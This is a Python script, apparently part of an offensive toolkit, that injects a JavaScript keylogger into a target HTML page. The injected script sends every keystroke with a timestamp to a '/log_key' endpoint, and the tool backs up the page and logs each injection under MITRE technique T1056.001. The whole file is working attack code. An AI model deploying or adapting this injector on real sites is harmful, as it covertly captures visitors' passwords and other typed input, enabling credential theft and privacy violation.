# modules/exploits/javascript_keylogger_injector.py

import argparse
import os
import shutil
from datetime import datetime

KEYLOGGER_SCRIPT = """
<script>
document.addEventListener('DOMContentLoaded', function () {
  document.addEventListener('keydown', function(e) {
    fetch('/log_key', {
      method: 'POST',
      body: JSON.stringify({ key: e.key, time: new Date().toISOString() }),
      headers: { 'Content-Type': 'application/json' }
    });
  });
});
</script>
"""

LOG_DIR = "results/keylogs"
INJECTION_LOG = "results/exploit_logs.json"
MITRE_TTP = "T1056.001"  # Input Capture - Keylogging

def inject_keylogger(html_path):
    if not os.path.exists(html_path):
        raise FileNotFoundError(f"HTML file not found: {html_path}")

    with open(html_path, "r") as f:
        content = f.read()

    if "<script>" in content:
        print("[!] Script tag already detected. Injection skipped.")
        return

    injected = content.replace("</body>", KEYLOGGER_SCRIPT + "\n</body>")

    backup = html_path + ".bak"
    shutil.copy(html_path, backup)

    with open(html_path, "w") as f:
        f.write(injected)

    print(f"[✓] Keylogger injected into: {html_path}")
    print(f"[✓] Backup saved as: {backup}")

    os.makedirs(LOG_DIR, exist_ok=True)
    log_entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "target_html": html_path,
        "ttp": MITRE_TTP
    }

    if os.path.exists(INJECTION_LOG):
        import json
        with open(INJECTION_LOG, "r") as f:
            data = json.load(f)
    else:
        data = []

    data.append(log_entry)
    with open(INJECTION_LOG, "w") as f:
        import json
        json.dump(data, f, indent=2)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Inject JS Keylogger into HTML")
    parser.add_argument("--html", required=True, help="Target HTML file to inject")
    args = parser.parse_args()
    inject_keylogger(args.html)
